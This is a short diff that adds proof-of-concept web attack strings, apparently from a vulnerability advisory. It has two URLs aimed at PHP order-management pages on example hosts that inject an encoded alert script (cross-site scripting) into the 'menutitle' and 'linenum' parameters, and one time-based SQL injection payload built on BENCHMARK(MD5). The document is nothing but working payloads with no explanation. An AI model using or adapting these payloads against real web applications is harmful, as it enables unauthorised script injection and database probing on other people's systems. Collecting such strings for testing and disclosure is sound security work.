@@ -1,0 +1,7 @@
+http/www.example.com/sidemenu.php?index=1&amp;menutitle=%3Cscript%3Ealert%28String.fromCharCode%2888,83,83,32,102,111,117,110,100,32,98,121,32,67,111,114,101,108,97,11
+0,32,84,101,97,109%29%29;%3C/script%3E&amp;menutitleorig=STR_ORDERS
+
+http://www.example.om/nporderitemremote.php?pos_mode=1&amp;currency=USD&amp;curdate=2010-04-12&amp;linenum=%3Cscript%3Ealert%28String.fromCharCode%2888,83,83,32,102,111,117,110
+,100,32,98,121,32,67,111,114,101,108,97,110,32,84,101,97,109%29%29;%3C/script%3E&amp;inventorylocationid=1&amp;customerid=&amp;shiptoid=0
+
+1 or BENCHMARK(2500000,MD5(1))
